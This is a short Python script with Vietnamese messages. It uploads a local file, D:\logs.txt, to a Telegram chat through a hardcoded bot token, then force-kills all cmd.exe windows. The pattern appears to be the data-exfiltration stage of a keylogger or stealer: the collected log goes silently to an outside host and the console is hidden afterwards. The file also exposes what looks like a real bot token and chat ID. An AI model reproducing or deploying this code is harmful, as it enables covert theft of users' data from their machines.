import os
import requests

# Info
bot_token = '6828748542:AAHNoYjlYhmHqy3gbvSQ-wbB5_jkcuAZNX8'
chat_id = '-4236407240'
file_path = r'D:\logs.txt'

# URL API of Telegram
url = f'https://api.telegram.org/bot{bot_token}/sendDocument'

try:
    # Open file and send
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id}
        response = requests.post(url, data=data, files=files)

    # Check the response
    if response.status_code == 200:
        print('File đã được gửi thành công!')
    else:
        print('Có lỗi xảy ra:', response.text)
except Exception as e:
    print('Có lỗi xảy ra:', str(e))

# Shutdown cmd
os.system("taskkill /f /im cmd.exe")
